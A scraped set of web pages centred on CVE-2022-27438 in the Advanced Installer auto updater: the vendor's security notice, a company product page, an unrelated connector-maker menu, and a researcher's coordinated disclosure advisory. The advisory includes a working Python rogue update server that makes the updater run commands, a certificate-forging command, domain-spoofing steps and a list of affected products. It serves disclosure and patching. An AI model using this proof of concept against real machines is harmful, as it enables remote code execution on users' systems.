=== Content from www.advancedinstaller.com_9b971392_20250114_212237.html ===
[![Advanced Installer](/svg/common/iconNavLogo.svg)](/)[Trusted Signing
 Integration
###### Learn more ›](/trusted-signing-integration.html)Toggle navigation

* Featuresfeatures by EDITION:[![](/svg/dropdown/features/iconArchitect.svg)ArchitectManage any packaging project with our Repackager, MSI(X) editing, and MECM/Intune integration for a complete application lifecycle.

  Explore Architect Features ›](/top-architect-features.html)[![](/svg/dropdown/features/iconEnterprise.svg)EnterpriseAutomate team workflows with CI/CD integrations & auto-updates for your end-users, while leveraging our team management portal for smooth collaboration.

  Explore Enterprise Features ›](/top-enterprise-features.html)[![](/svg/dropdown/features/iconProfessional.svg)ProfessionalCreate secure MSI, EXE, and MSIX installers with PowerShell Automation, Visual Studio Integration, and Trusted Signing for robust packaging.

  Explore Professional Features ›](/top-professional-features.html)[![](/svg/dropdown/features/iconFree.svg)FreewareBuild basic installers quickly with essential tools for small packaging projects.

  Explore Freeware Features ›](/top-freeware-features.html)FEATURES by role:[![for devs](/svg/dropdown/features/iconDevs.svg "for devs")
  For Developers](/features.html)[![for professional](/svg/dropdown/features/iconPackagers.svg "for professional")
  For IT Pros](/enterprise-software-packaging-tool.html)[![for professional](/svg/dropdown/features/iconPackacgeStan.svg "for professional")
  For Managed Service Providers](/application-packaging-for-managed-service-providers.html)or[Browse all features ›](/feats-list.html)[Get a FREE Personalized Demo!](/demo-request.html)
* [Resources](/hub/ "Resources")
* [Analytics](/analytics/ "Installer Analytics")
* [Help](/support.html "Advanced Installer - Support")
* [Community](/forums/ "Advanced Installer Forums")
* [Blog](/blog/ "Advanced Installer Blog")
* [Purchase](/purchase.html "Advanced Installer - Purchase")

* [Download](/download.html "Advanced Installer - Download")
[Start Free Trial](/trial.html)[BlogThe MSIx Experts Crib](/blog/)All Categories  [**All Categories**](/blog/ "All                 Categories") [**Advanced Installer Releases**](/blog/advanced-installer-releases-page-1.html "Advanced Installer Releases")[**MSIX**](/blog/msix-page-1.html "MSIX")[MSIX](/blog/msix-page-1.html "MSIX")[PSF](/blog/psf-page-1.html "PSF")[**Scripting & Deployment**](/blog/scripting-and-deployment-page-1.html "Scripting & Deployment")[Appdata](/blog/appdata-page-1.html "Appdata")[Application resources](/blog/application-resources-page-1.html "Application resources")[Automation](/blog/automation-page-1.html "Automation")[Custom action](/blog/custom-action-page-1.html "Custom action")[MSP](/blog/msp-page-1.html "MSP")[MST](/blog/mst-page-1.html "MST")[Powershell](/blog/powershell-page-1.html "Powershell")[Update](/blog/update-page-1.html "Update")[Windows](/blog/windows-page-1.html "Windows")[Testing](/blog/testing-page-1.html "Testing")[Intune](/blog/intune-page-1.html "Intune")[SCCM](/blog/sccm-page-1.html "SCCM")[**Automation & Continuous Integration**](/blog/automation-and-ci-page-1.html "Automation & Continuous Integration")[Azure](/blog/azure-page-1.html "Azure")[Continuous integration](/blog/continuous-integration-page-1.html "Continuous integration")[Devops](/blog/devops-page-1.html "Devops")[IIS](/blog/iis-page-1.html "IIS")[Jenkins](/blog/jenkins-page-1.html "Jenkins")[Python](/blog/python-page-1.html "Python")[Teamcity](/blog/teamcity-page-1.html "Teamcity")[Visual studio](/blog/visual-studio-page-1.html "Visual studio")[Web](/blog/web-page-1.html "Web")[Database](/blog/database-page-1.html "Database")[Updater](/blog/updater-page-1.html "Updater")[**Conversion & Editing**](/blog/conversion-and-editing-page-1.html "Conversion & Editing")[Appdata](/blog/appdata-page-1.html "Appdata")[Application resources](/blog/application-resources-page-1.html "Application resources")[Application virtualization](/blog/application-virtualization-page-1.html "Application virtualization")[AppV](/blog/appv-page-1.html "AppV")[AppX](/blog/appx-page-1.html "AppX")[Desktop bridge](/blog/desktop-bridge-page-1.html "Desktop bridge")[Import](/blog/import-page-1.html "Import")[Installer compression](/blog/installer-compression-page-1.html "Installer compression")[Installer conditions](/blog/installer-conditions-page-1.html "Installer conditions")[Java](/blog/java-page-1.html "Java")[Localization](/blog/localization-page-1.html "Localization")[Bootstrapper](/blog/bootstrapper-page-1.html "Bootstrapper")[Migration](/blog/migration-page-1.html "Migration")[MSI](/blog/msi-page-1.html "MSI")[Services](/blog/services-page-1.html "Services")[User interface](/blog/user-interface-page-1.html "User interface")[Wise](/blog/wise-page-1.html "Wise")[Wix](/blog/wix-page-1.html "Wix")[XML](/blog/xml-page-1.html "XML")[Digital signature](/blog/digital-signature-page-1.html "Digital signature")[Tips](/blog/tips-page-1.html "Tips")[**Repackaging**](/blog/repackaging-page-1.html "Repackaging")[Enterprise packaging](/blog/enterprise-packaging-page-1.html "Enterprise packaging")[Packaging series](/blog/packaging-series-page-1.html "Packaging series")[Repackager](/blog/repackager-page-1.html "Repackager")[Virtual machine](/blog/virtual-machine-page-1.html "Virtual machine")[**Free tools**](/blog/free-tools-page-1.html "Free tools")[Hover](/blog/hover-page-1.html "Hover")[Tools](/blog/tools-page-1.html "Tools")[**Product & News**](/blog/product-and-news-page-1.html "Product & News")[Event](/blog/event-page-1.html "Event")[False positive](/blog/false-positive-page-1.html "False positive")[Licensing](/blog/licensing-page-1.html "Licensing")[Malware](/blog/malware-page-1.html "Malware")[News](/blog/news-page-1.html "News")[Virus](/blog/virus-page-1.html "Virus")[Webinar](/blog/webinar-page-1.html "Webinar")[Documentation](/blog/documentation-page-1.html "Documentation")[**Analytics**](/blog/analytics-page-1.html "Analytics")[Analytics](/blog/analytics-page-1.html "Analytics")[**Security**](/blog/security-page-1.html "Security")[Security](/blog/security-page-1.html "Security")[RSS](rss-feeds.html "Advanced Installer - RSS Feeds")AboutAdvanced Installer helps you create
powerful and reliable MSI, App-V & MSIX packages. Upgraded [every month](../version-history.html)
by our team, since 2003.

**Newsletter**

Subscribe for the best insights on MSI and MSIX Technology
# Important Security Updates for the Advanced Installer Auto Updater

Written by [Alexandra Stoienescu](/authors/alexandra-stoienescu.html) · June 9th, 2022 · 2min read

[#NEWS](/blog/news-page-1.html)[#UPDATE](/blog/update-page-1.html)[#UPDATER](/blog/updater-page-1.html)[#SECURITY](/blog/security-page-1.html)

Continuously managing security improvements and updates, as we do at Advanced Installer, should be your top priority.

At the beginning of this spring, with the release of Advanced Installer 19.4, we implemented several improvements to mitigate potential security exploits that could affect customers who use the [Auto Updater](auto-updater.html "Automate Windows Application Updates with Advanced Updater") feature of Advanced Installer.

### Description | Auto Updater Vulnerability

The Auto Updater vulnerability involves the possibility of an attack that could be initialized towards an end-user machine that is running the Auto Updater, tricking it to run another EXE file that is present on that machine.

However, the vulnerability alone is insufficient for an attacker to exploit a machine.

As part of a separate attack unrelated to our Auto Updater, the attacker would additionally need to download a malicious EXE file onto the machine. The chances for an attacker to synchronize the two attacks are practically zero, and none of our customers have reported such issues so far.

### Fixes | Auto Updater Security Improvements

We take all the security vulnerabilities seriously and extra cautiously thus **we’ve made a few changes to the Updater’s workflow.** Here are the changes you need to be aware of:

* Users can no longer download updates over an untrusted/expired HTTPS connection *(before version 19.4, this was treated as a warning, and users could ignore it, if they chose so)*
* When using the custom EXE detection method, the detection EXE used must be signed using the same digital certificate that was used to sign the updater.exe included in your setup package; otherwise, the check for updates will fail.
### What should I do?

Advanced Installer 19.4 and newer versions include all the improvements for the vulnerability described above.

Make sure you are using Advanced Installer 19.4 or [a newer version](download.html "Advanced Installer - Download") to build your setup package.

If you are not using the Auto Updater from Advanced Installer, there is no action needed.

### Credit

We would like to thank [Gerr.re](https://gerr.re/posts/cve-2022-27438/ "Gerr.re") for discovering and reporting the Auto Updater vulnerability to the Advanced Installer team.

We want you to know that we take these security improvements very seriously and advise you to [upgrade your Advanced Installer version](https://www.advancedinstaller.com/resources/AdvancedInstallerUpgradeGuide.pdf "upgrade your Advanced Installer version").

If you have any questions, please feel free to email us at *support@advancedinstaller.com*.

### Subscribe to Our Newsletter

Sign up for free and be the first to receive the latest news, videos, exclusive How-Tos, and guides from Advanced Installer.

Show comments ({{ comments.length }})
Hide comments
#### Comments:

## Popular Articles

![bannerFloatingIcons](/svg/webinar-announcement-banner/bannerFloatingIcons.svg "bannerFloatingIcons")Free Training Program in MSI Packaging EssentialsSelf-paced, 100% Online[Get Your Certification](https://www.advancedinstaller.com/application-packaging-training/msi/certification.html?utm_source=website&utm_medium=website_banner_promo&utm_campaign=msi_packaging_essentials)Cookies help us deliver you a better web experience. By continuing to use our website, you agree to [our use of cookies](/privacy-policy.html).Okay, got it

CAPHYON PRODUCTS

* [Advanced Installer](/ "Free Windows Installer - MSI Installer Tool - Advanced Installer")
* [PacKit](https://www.getpackit.com/)
* [Installer Analytics](https://installeranalytics.com/)
* [Advanced Web Ranking](https://www.advancedwebranking.com/)
* [Clang Power Tools](https://www.clangpowertools.com/)
* [Wattspeed](https://wattspeed.com/)
* [Bytes Route](https://www.bytesroute.com/)

COMPANY

* [About Us](/about-us.html "About Us")
* [Contact](/contact.html "Contact")
* [Partners](/partners.html "Partners")
* [Press Information](/press-info.html "Press Information")

PRODUCT

* [Manage Your Account](https://account.advancedinstaller.com)
* [Help](/support.html "Help")
* [Download](/download.html "Download")
* [Documentation](/user-guide/introduction.html "Documentation")
* [Features](/features.html "Features")
* [Forum](/forums/ "Forum")
* [Pricing](/purchase.html "Pricing")
* [Free Trial](/trial.html "Free Trial")
* [Customers](/customers-list.html "Customers")
* [Release Notes](/blog/advanced-installer-releases-page-1.html "Release Notes")
* [Case Studies](/case-studies/ "Case Studies")
* [Testimonials](/testimonials.html "Testimonials")
* [Get a Demo](/demo-request.html "Get a Demo")

RESOURCES

* [MSIX Packaging Fundamentals ebook](/application-packaging-training/msix-packaging/ebook.html "MSIX Packaging Fundamentals ebook")
* [Advanced MSI Packaging ebook](/application-packaging-training/msi-advanced/ebook.html "Advanced MSI Packaging ebook")
* [MSI Packaging ebook](/application-packaging-training/msi/ebook.html "MSI Packaging ebook")
* [MSIX Ready](/msix-ready.html "MSIX Ready")
* [MSIX Introduction](/msix-introduction.html "MSIX Introduction")
* [Alternatives](/versus/wix-toolset.html "Alternatives")
* [Packaging Checklist for Devs](/software-packaging-checklist.html "Packaging Checklist for Devs")
* [MSIX Succinctly ebook](/msix-succinctly.html "MSIX Succinctly ebook")
* [Installer Testing Guide ebook](/application-packaging-testing-process-guide.html "Installer Testing Guide ebook")
* [Integration with Visual Studio](/application-packaging-tool-integration-with-visual-studio.html "Integration with Visual Studio")
* [Advanced Installer Upgrade Guide](/resources/AdvancedInstallerUpgradeGuide.pdf "Advanced Installer Upgrade Guide")
* [Trusted Signing Integration](/trusted-signing-integration.html "Trusted Signing Integration")
* [Blog](/blog/ "Blog")

FREE TOOLS

* [MSIX Troubleshooter](/msix-troubleshooter.html "MSIX Troubleshooter")
* [MSIX Tweaker](/msix-tweaker.html "MSIX Tweaker")
* [Advanced Installer Express](/express-edition.html "Advanced Installer Express")
* [Advanced Installer Free](/advanced-installer-free.html "Advanced Installer Free")
* [Hover](/hover.html "Hover")
* [PacKit Free](https://www.advancedinstaller.com/packit.html "PacKit Free")
* [TweakAppV](/appv-editor.html "TweakAppV")
* [Visual Studio Extension](/visual-studio-extension.html "Visual Studio Extension")

Application Packaging Academy

[MSI Packaging Essentials Training and Certification](/application-packaging-training/msi.html)[Advanced MSI Packaging Training and Certification](/application-packaging-training/msi-advanced/overview.html)

CONNECT

* [RSS](/rss-feeds.html)
* [Twitter](https://twitter.com/advinst)
* [YouTube](https://www.youtube.com/user/AdvancedInstaller)
* [LinkedIn](https://ro.linkedin.com/company/advancedinstaller)
* [Facebook](https://www.facebook.com/AdvancedInstaller)
* [GitHub](https://caphyon.github.io/)
* [Stack Overflow](https://stackoverflow.com/questions/tagged/advanced-installer)

[![Advanced Installer, a Microsoft Partner](/img/all/msft-2line-black-logo.png "Advanced Installer, a Microsoft Partner")](https://learn.microsoft.com/en-us/windows/msix/partners)

Application Packaging Academy

[MSI Packaging Essentials Training and Certification](/application-packaging-training/msi.html)[MSI Packaging Essentials Training and Certification](/application-packaging-training/msi-advanced/overview.html)[![Advanced Installer, a Microsoft Partner](/img/all/msft-1line-black-logo.png "Advanced Installer, a Microsoft Partner")](https://learn.microsoft.com/en-us/windows/msix/partners)[![Advanced Installer, a Microsoft Partner](/img/all/msft-1line-black-logo.png "Advanced Installer, a Microsoft Partner")](https://learn.microsoft.com/en-us/windows/msix/partners)
© Caphyon
2002 -
2025
Ltd. Trademarks belong to their respective owners. All rights
reserved.
[Privacy](/privacy-policy.html)  |  [Site Map](/sitemap.html)

=== Content from caphyon.com_a278bdf9_20250114_212235.html ===


* [Testimonials](testimonials.html)
* [Press](press.html)
* [Contact](contact.html)
# We make great software products.

## Used by people all over the world. [See what they're saying.](testimonials.html "Testimonials")

[![Advanced Web Ranking](img/index/awr-icon.svg "Advanced Web Ranking")](https://www.advancedwebranking.com/)
## Advanced Web Ranking

Advanced Web Ranking is a website ranking software which helps manage your search engine rankings intelligently.

* Local and mobile rank tracking
* Comprehensive Keyword Research Tools
* Audit your website and monitor competitors

[View website](https://www.advancedwebranking.com/)[![Advanced Installer](img/index/ai-icon.svg "Advanced Installer")](https://www.advancedinstaller.com/)
## Advanced Installer

Advanced Installer is a powerful, yet easy to use, Windows Installer authoring tool which helps you create .MSI installs in minutes.

* Save on development costs
* Increase customer satisfaction
* Reduce your support costs

[View website](https://www.advancedinstaller.com/)[![Clang Power Tools](img/index/clang-icon.svg "Clang Power Tools")](https://clangpowertools.com/ "Clang Power Tools")
## Clang Power Tools

Clang Power Tools is a Visual Studio extension helping C++ developers modernize and transform their code to C++11/14/17 standards by using LLVM's static analyzer and CppCoreGuidelines.

* Clang compile directly from Visual Studio
* Bring Clang tidy magic to C++ developers
* Take advantage of Clang format

[View website](https://clangpowertools.com/ "Clang Power Tools")[![Bytes Route](img/index/brt-icon.svg "Bytes Route")](https://bytesroute.com/ "Bytes Route")
## Bytes Route

Create interactive tutorials for any web page without writing code. Bytes Route enables you to learn a web application while using it.

* Speed up your customer onboarding
* Scale training for your employees or customers
* Faster and better than videos tutorials

[View website](https://bytesroute.com/ "Bytes Route")[![Wattspeed](img/index/ws-icon.svg "Wattspeed")](https://wattspeed.com/ "Wattspeed")
## Wattspeed

Wattspeed is a free tool that generates snapshots - historical captures of your web pages that include Lighthouse scores, a list of technologies, W3C HTML validator results, DOM size, mixed content info, and more.

* Page source differences and technologies
* Lighthouse integration
* Metrics and score monitoring using Slack and email alerts

[View website](https://wattspeed.com/ "Wattspeed")

=== Content from gerr.re_ba4c690c_20250114_212236.html ===


[![](https://gerr.re/gerr.re_logo.png)Gerr.re](https://gerr.re/ "Gerr.re (Alt + H)")

* [Contact](https://gerr.re/contact/ "Contact")
* [Disclosure Policy](https://gerr.re/disclosure-policy/ "Disclosure Policy")
* [Archive](https://gerr.re/archives/ "Archive")
* [Tags](https://gerr.re/tags/ "Tags")

# CVE-2022-27438

June 1, 2022 Â· 7 min Â· Gerr.re

![](https://gerr.re/posts/cve-2022-27438/cover.png)
Table of Contents

* [Advisory Information](#advisory-information)
* [Vulnerability Information](#vulnerability-information)
  + [CVSSs](#cvsss)
* [High-level overview](#high-level-overview)
* [Root Cause Analysis](#root-cause-analysis)
* [Proof of Concept](#proof-of-concept)
  + [Testsetup](#testsetup)
  + [Steps to reproduce](#steps-to-reproduce)
* [Recommendations](#recommendations)
* [Report Timeline](#report-timeline)
* [Disclaimer](#disclaimer)

Caphyon Ltd Advanced Installer 19.3 “CustomDetection” Update Check Remote Code Execution Vulnerability ([PDF](https://github.com/gerr-re/cve-2022-27438/blob/main/cve-2022-27438_public-advisory.pdf))

# Advisory Information[#](#advisory-information)

* **Title:** Caphyon Ltd Advanced Installer 19.3 “CustomDetection” Update Check Remote Code Execution Vulnerability
* **Vendor Advisory:** [*Important Security Updates for the Advanced Installer Auto Updater*](https://www.advancedinstaller.com/security-updates-auto-updater.html)
* **Release mode:** Coordinated Release

# Vulnerability Information[#](#vulnerability-information)

* **Class:** Download of Code Without Integrity Check [[CWE-494]](https://cwe.mitre.org/data/definitions/494.html)
* **Affected Products:** [Advanced Installer](https://www.advancedinstaller.com) 19.3 and earlier, and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater.
* **Remotely Exploitable:** Yes
* **Locally Exploitable:** Yes
* **Severity:** Critical - [9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1)
* **CVE Identifier:** [CVE-2022-27438](https://nvd.nist.gov/vuln/detail/CVE-2022-27438)
* **Products tested to be vulnerable:**
  + 3CX Ltd Call Flow Designer 18.2.13 (TLS)
  + 3CX Ltd CRM Template Generator 2.1.23 (TLS)
  + BoomTV Inc Streamer Portal 2.2.1 (TLS)
  + Caphyon Ltd Advanced Installer 19.3 (TLS)
  + Code Sector Direct Folders 4.0 (TLS)
  + Code Sector TeraCopy 3.8.5 (TLS)
  + Emurasoft Inc EmEditor 21.3.0
  + ESI Technology Ltd ESI-USB Software 2.5.4.0
  + Flamory Flamory 4.2.19.0 (TLS/elevated)
  + Freesnippingtool.com Free Snipping Tool 5.6.0.0 (TLS)
  + FxSound LLC FxSound 1.1.12.0 (TLS)
  + Gainedge Software Better Explorer 2020.3.15.1304 (TLS)
  + Gamecaster Pte Ltd Gamecaster 4.0.2109.2802 (TLS/elevated)
  + GuzoGo Travel PLC GuzoGo: Compare and Book Flight Tickets 1.0.5.0
  + Honeygain Honeygain for Windows 0.10.7.0 (TLS)
  + JKI Soft VI Package Manager 21.1.2754
  + JP Software Inc Take Command 28.2.18 (TLS)
  + KRyLack Software KRyLack Archive Password Recovery 3.70.69
  + KRyLack Software Asterisks Password Decryptor 3.31.107
  + KRyLack Software Burning Suite 1.20.05
  + KRyLack Software RAR Password Recovery 3.70.69
  + KRyLack Software Volume Serial Number Editor 2.02.34
  + KRyLack Software ZIP Password Recovery 3.70.69
  + Mailbird Inc Mailbird 2.9.50.0 (TLS)
  + Moon Software Password Agent 20.10.1
  + Nefarius Software Solutions e.U. ScpToolkit 1.6.238.16010 (TLS)
  + Nefarius Software Solutions e.U. ViGEm Bus Driver 1.16.116 (TLS)
  + Parade Technologies Ltd USB 3.0 to VGA/DVI/HDMI Driver 2.1.36287.0
  + Plagiarism Checker X 8.0.6 (TLS)
  + Prusa Research a.s. Slicer 2.4.2 (TLS)
  + RealDefense LLC MyCleanID 4.1.4 (elevated)
  + RealDefense LLC MyCleanPC 4.0.2 (TLS/elevated)
  + RealDefense LLC MyPassLock 1.9.6
  + Rovio Entertainment Ltd Angry Birds Space 1.4.1
  + Rovio Entertainment Ltd Bad Piggies 1.3.0
  + RST Instruments Ltd DT Logger Host Software 1.19.4.0
  + RST Instruments Ltd Inclinalysis Digital Inclinometer Software 2.48.9
  + RST Instruments Ltd IPI Utility Software 1.05.0
  + RST Instruments Ltd Readout Host Software 1.4.0.2
  + RST Instruments Ltd RSTAR RTU Host Software 1.33.0
  + RST Instruments Ltd Tilt Meter Host Software 1.20.1
  + RST Instruments Ltd VW0420 Vibrating Wire Isolated Analog Interface Software 1.33.0
  + SplitmediaLabs Ltd XSplit Express Video Editor 3.0.2001.801 (TLS)
  + UrbanVPN VPN for Windows 2.2.5 (TLS)
  + Virtual Desktop Inc Virtual Desktop Streamer 1.20.16 (TLS)
  + VpnHood VpnHood Client for Windows 2.4.299 (TLS)

## CVSSs[#](#cvsss)

Affected products perform their update check either unauthenticated through HTTP or through TLS/HTTPS. Moreover, some updaters run as an administrative user at high integrity. As a result, depending on the affected product the CVSS differs.

Unauthenticated/HTTP, elevated: [9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1)

Unauthenticated/HTTP: [8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1)

TLS, elevated: [8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H&version=3.1)

TLS: [8.0 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1)

# High-level overview[#](#high-level-overview)

This vulnerability allows remote attackers to execute arbitrary code on the affected installations of Caphyon Ltd Advanced Installer and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater.
A man-in-the-middle position is required to exploit this vulnerability.
User interaction is required in that the Windows untrusted certificate security alert has to be proceeded (only for updaters using TLS).

The specific flaw exists in the updater of Advanced Installer, which insufficiently authenticates its update server.
An attacker can spoof these update servers and leverage this vulnerability to execute code in the context of the current user.

# Root Cause Analysis[#](#root-cause-analysis)

The vulnerability is caused by the updater of Advanced Installer: Advanced Updater, part of Caphyon Ltd Advanced Installer.
From the Advanced Installer [User Guide](https://www.advancedinstaller.com/user-guide/updates-configuration.html) we find that the updater allows for specifying an alternate update check using the `CustomDetection` and `CustomDetectionParameter` in the requested update configuration.

By default, the update check is triggered automatically after starting the application and with a 2 day interval, and manually through the application menu or executing the update binary.

In the case of Advanced Installer 19.3, the update requests `https://www.advancedinstaller.com/downloads/updates.ini`, which can contain a specified `CustomDetection` (any binary on the local system) and `CustomDetectionParameter` (its parameters), which the application executes in the context of the current user.

# Proof of Concept[#](#proof-of-concept)

The below script is used as a proof of concept. For affected products that request an update over HTTP, skip the `ssl.wrap_socket` call and change the port to 80.

```
#!/usr/bin/env python3
# Proof of concept script for Caphyon Ltd Advanced Installer "CustomDetection" Update Check Remote Code Execution Vulnerability
# See report for details.
#
# Generate self-signed certificate using e.g.
# > openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj "/CN=www.advancedinstaller.com"
#
# Author: Gerr.re
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl

# CustomDetection with CustomDetectionParams is executed after receiving the response.
# Note that we set exitcode != 0 s.t. the updater thinks there is no new update (so no visual feedback on exploit).
updateconfig = b''';aiu;
[Update]
Name = Caphyon Ltd Advanced Updater CustomDetection Update Check Remote Code Execution Vulnerability
URL = http://example.com/doesnotmatter
Size = 1024
CustomDetection = c:\windows\system32\cmd.exe
CustomDetectionParams = /c "c:\windows\system32\calc.exe && exit 1"
'''

class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "updates.ini" in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(updateconfig)
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    print("Running Server")

    try:
        httpd = HTTPServer(("0.0.0.0", 443), HTTPHandler)
        httpd.socket = ssl.wrap_socket(httpd.socket,
                                server_side=True,
                                certfile='www.advancedinstaller.com.pem',
                                ssl_version=ssl.PROTOCOL_TLS)
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()

```
## Testsetup[#](#testsetup)

This proof of concept was tested on target Windows 10 21H2 with Caphyon Ltd Advanced Installer 19.3 installed, and attacker Ubuntu 20.04.3 LTS.

## Steps to reproduce[#](#steps-to-reproduce)

For other affected products, you have to change the update server and update configuration filename. These can often be found in the updater `.ini` in the application installation directory.

1. Install [Advanced Installer 19.3](https://www.advancedinstaller.com/downloads/advinst.msi);
2. Set spoof `www.advancedinstaller.com` to our attacker ip;
   * For the proof of concept it is easiest to edit `c:\windows\system32\drivers\etc\hosts` on the target.
     + Attackers may e.g. use:
       - poorly configured routers/switches/DNS
       - DNS spoof / cache poisoning
       - ARP spoof / cache poisoning
3. Generate self-signed certificates;
   * e.g. using `openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj "/CN=www.advancedinstaller.com"`
4. Run the proof of concept script on the attacker;
5. Start Advanced Installer to trigger update automatically, or
   * wait for 2 days to trigger update automatically, or
   * trigger update manually through the application menu/settings, or
   * trigger update manually by starting the update application at `C:\Program Files (x86)\Caphyon\Advanced Installer 19.3\bin\x86\updater.exe`;
6. Proceed with the Windows untrusted certificate security alert (if applicable).

As a result, the binary specified in `CustomDetection` with parameters specified in `CustomDetectionParameters` is executed in the context of the current user.

![<code>CustomDetection</code> with parameters specified in <code>CustomDetectionParameters</code> is executed in the context of the current user](proof.png)

# Recommendations[#](#recommendations)

The vulnerability presents itself because there is insufficient authentication from the update server. This vulnerability is fixed in Advanced Installer 19.4.

We recommend vendors of affected products to build the product using Advanced Installer 19.4 and release this update as soon as possible. Mention the update and CVE-2022-27438 in the changelog.

We recommend users of affected products to update to a fixed version as soon as possible. Refer to the website of the affected product for updates and changelogs (look for “CVE-2022-27438 fix”).

# Report Timeline[#](#report-timeline)

* **11-02-2022:** Initial contact with the vendor via support@advancedinstaller.com.
* **21-02-2022:** Vendor releases version 19.2 which is still vulnerable.
* **04-03-2022:** Gerr.re sent reminder to support@advancedinstaller.com after no response.
* **18-03-2022:** Gerr.re sent a request to Mitre for a CVE ID.
* **18-03-2022:** Gerr.re sent final reminder to support@advancedinstaller.com after no response.
* **21-03-2022:** Vendor releases version 19.3 which is still vulnerable.
* **21-03-2022:** Vendor replies, requesting technical details.
* **21-03-2022:** A draft report with technical details and a proof of concept application was sent to the vendor.
* **22-03-2022:** Vendor acknowledges reception of technical details.
* **23-03-2022:** Vendor confirms the vulnerability.
* **24-03-2022:** Vendor shares release candidate 19.4 and requests a retest on the fixes.
* **25-03-2022:** Gerr.re confirms the fixes and sends further security recommendations.
* **29-03-2022:** Vendor sends questions regarding security recommendations.
* **06-04-2022:** Gerr.re sends additional information to answer the questions.
* **26-04-2022:** Vendor releases [version 19.4](https://www.advancedinstaller.com/release-19.4.html) that includes the fixes.
* **28-04-2022:** Mitre assigns CVE-2022-27438.
* **01-06-2022:** Coordinated release.
* **12-06-2022:** Gerr.re sends remarks regarding false assumptions made in the vendor advisory.
* **20-06-2022:** Updated public advisory with link to vendor advisory.

# Disclaimer[#](#disclaimer)

The contents of this advisory are copyright Â© 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International ([CC BY-ND 4.0](https://creativecommons.org/licenses/by-nd/4.0/))

* [cwe\_494](https://gerr.re/tags/cwe_494/)
* [coordinated\_release](https://gerr.re/tags/coordinated_release/)

© 2024 [Gerr.re](https://gerr.re/)



=== Content from advanced.com_5c7a9505_20250114_212232.html ===


* [![](/uploads/media_items/logo.219.61.s.png)](/)

Microsites:
[Chinese](/pages/cn)
|
[Japanese](/pages/jp)

* About
  + [Company Profile](https://www.advanced.com/about/company-profile)
  + [Quality & Compliance](https://www.advanced.com/about/quality-compliance)
    - [Quality Policy](https://www.advanced.com/about/quality-compliance/quality-policy)
    - [ISO Certificate](https://www.advanced.com/about/quality-compliance/iso-certificate)
    - [Environmental Compliance](https://www.advanced.com/about/quality-compliance/environmental-compliance)
    - [ITAR Statement](https://www.advanced.com/about/quality-compliance/itar-statement)
    - [Counterfeit Parts Prevention](https://www.advanced.com/about/quality-compliance/counterfeit-parts-prevention)
    - [Supplier Qualification](https://www.advanced.com/about/quality-compliance/supplier-qualification)
  + [Events](https://www.advanced.com/about/events)
  + [News](https://www.advanced.com/about/news)
  + [Employment Opportunities](https://www.advanced.com/about/employment-opportunities)
* Products
  + [BGA Socketing Systems](https://www.advanced.com/products/bga-socketing-systems)
    - [BGA Socket Adapter Systems](https://www.advanced.com/products/bga-socketing-systems/socket-adapter-systems)
    - [Flip-Top™ BGA Test Sockets](https://www.advanced.com/products/bga-socketing-systems/flip-top-bga-test-sockets)
    - [SMT Adapters](https://www.advanced.com/products/bga-socketing-systems/smt-adapters)
    - [BGA Interposers](https://www.advanced.com/products/bga-socketing-systems/bga-interposers)
    - [SMT Value Added Services](https://www.advanced.com/products/bga-socketing-systems/device-attach-rework-services)
    - [Customized BGA Solutions](https://www.advanced.com/products/bga-socketing-systems/customized-bga-solutions)
  + [Board to Board Connectors](https://www.advanced.com/products/board-to-board-connectors)
    - [Mezza-pede® SMT Connectors](https://www.advanced.com/products/board-to-board-connectors/mezza-pede-smt-connectors)
    - [B2B® SMT Connectors](https://www.advanced.com/products/board-to-board-connectors/b2b-smt-connectors)
    - [Thru-hole Connectors](https://www.advanced.com/products/board-to-board-connectors/through-hole-sockets-headers)
    - [Right Angle Connectors](https://www.advanced.com/products/board-to-board-connectors/right-angle-connectors)
    - [Customized Connector Solutions](https://www.advanced.com/products/board-to-board-connectors/customized-connector-solutions)
  + [IC Sockets & Adapters](https://www.advanced.com/products/ic-socket-adapters)
    - [SIP Sockets & Adapters](https://www.advanced.com/products/ic-socket-adapters/sip-sockets-adapters)
    - [DIP Sockets & Adapters](https://www.advanced.com/products/ic-socket-adapters/dip-sockets-adapters)
    - [Closed Frame LED Sockets](https://www.advanced.com/products/ic-socket-adapters/closed-frame-led-sockets)
    - [Decoupling Capacitor DIP Sockets](https://www.advanced.com/products/ic-socket-adapters/decoupling-capacitor-dip-sockets)
    - [PGA Sockets & Adapters](https://www.advanced.com/products/ic-socket-adapters/pga-sockets-adapters)
    - [Image Sensor Sockets](https://www.advanced.com/products/ic-socket-adapters/image-sensor-sockets)
    - [Customized Sockets & Adapters](https://www.advanced.com/products/ic-socket-adapters/customized-ic-socket-solutions)
